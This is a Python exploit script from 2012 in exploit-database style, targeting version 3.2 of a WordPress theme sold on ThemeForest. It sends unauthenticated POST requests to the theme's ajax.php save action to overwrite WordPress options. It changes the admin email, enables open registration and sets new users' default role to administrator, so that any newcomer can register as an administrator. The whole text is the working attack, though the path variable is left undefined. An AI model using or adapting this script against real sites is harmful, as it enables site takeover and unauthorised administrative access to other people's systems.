# Date: Sept 29, 2012
# Exploit Author: bwall (@bwallHatesTwits)
# Vendor Homepage: http://themeforest.net/user/wptitans
# Version: 3.2
# Tested on: Ubuntu
import httplib, urllib

#target site
site = "10.10.10.5"
#path to ajax.php

def ChangeOption(site, url, option_name, option_value):
	params = urllib.urlencode({&#039;action&#039;: &#039;save&#039;, &#039;values[0][name]&#039;: option_name, &#039;values[0][value]&#039;: option_value})
	headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
	conn = httplib.HTTPConnection(site)
	conn.request("POST", url, params, headers)
	response = conn.getresponse()
	print response.status, response.reason
	data = response.read()
	print data
	conn.close()
	
ChangeOption(site, url, "admin_email", "fake@ballastsecurity.net")
ChangeOption(site, url, "users_can_register", "1")
ChangeOption(site, url, "default_role", "administrator")
print "Now register a new user, they are an administrator by default!"



